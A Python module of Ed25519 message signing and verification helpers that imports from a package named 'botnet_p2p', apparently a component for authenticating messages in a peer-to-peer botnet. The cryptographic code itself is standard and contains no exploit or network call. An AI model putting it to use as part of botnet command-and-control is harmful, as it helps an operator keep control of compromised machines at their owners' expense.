"""Utilities to sign and verify messages"""

import hashlib
import cryptography.hazmat.backends.openssl.ed25519
from cryptography.hazmat.primitives.asymmetric import ed25519

from botnet_p2p import ENCODING


def load_public_key(
    public_key: str
) -> cryptography.hazmat.backends.openssl.ed25519._Ed25519PublicKey:
    """ Load the public Ed25519 key from the binary file

        Args:
            publick_key: Path where the public key is located

        Returns:
            The key in a format that the cryptography module
            can manipulate
    """
    with open(public_key, "rb") as pub:
        pub_bytes = pub.read()

    return ed25519.Ed25519PublicKey.from_public_bytes(pub_bytes)


def sign_hash(hash_: bytes, private_key: str) -> bytes:
    """ Sign hash with a private key

        Args:
            hash_: Hash to sign
            private_key: Path where private key is located

        Returns:
            The signed hash in bytes
    """
    with open(private_key, "rb") as f:
        priv_bytes = f.read()
    final_private_key = ed25519.Ed25519PrivateKey.from_private_bytes(priv_bytes)
    return final_private_key.sign(hash_)


def calculate_hash(data: str) -> bytes:
    """ Calculate hash of a given string in bytes

        Args:
            data: Object in bytes from which we want its hash

        Returns:
            Hash of the object
    """
    return hashlib.sha256(data.encode(ENCODING)).hexdigest().encode(ENCODING)


def verify_message(public_key: str, msg: str, signed_hash: bytes) -> bool:
    """ Check if the message can be trusted

        Args:
            public_key: Path were the public key is stored
            msg: Message
            signed_hash: Signed hash of the message

        Returns:
            Wheter the message can be trusted or not
    """
    msg_hash = calculate_hash(msg)
    public_key_bytes = load_public_key(public_key)
    try:
        public_key_bytes.verify(signed_hash, msg_hash)
    except cryptography.exceptions.InvalidSignature:
        return False

    return True
